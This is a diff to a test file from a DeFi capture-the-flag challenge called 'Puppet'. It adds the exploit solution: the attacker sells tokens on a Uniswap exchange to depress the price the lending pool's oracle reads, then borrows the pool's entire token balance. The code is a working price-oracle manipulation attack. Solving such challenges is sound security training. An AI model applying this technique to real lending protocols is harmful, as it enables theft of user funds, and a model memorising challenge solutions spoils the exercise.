@@ -1,4 +1,4 @@
-const { ether, BN, balance } = require('@openzeppelin/test-helpers');
+const { ether, BN, balance, constants } = require('@openzeppelin/test-helpers');
 const { accounts, contract, web3 } = require('@openzeppelin/test-environment');
 const { expect } = require('chai');
 
@@ -93,6 +93,13 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        
+        // Lower price on oracle by selling token
+        await this.token.approve(this.uniswapExchange.address, constants.MAX_UINT256, {from: attacker});
+        await this.uniswapExchange.tokenToEthSwapInput(ether("100"), 10, constants.MAX_UINT256, {from: attacker});
+        
+        // Perform borrow
+        await this.lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE, {from: attacker});
     });
 
     after(async function () {
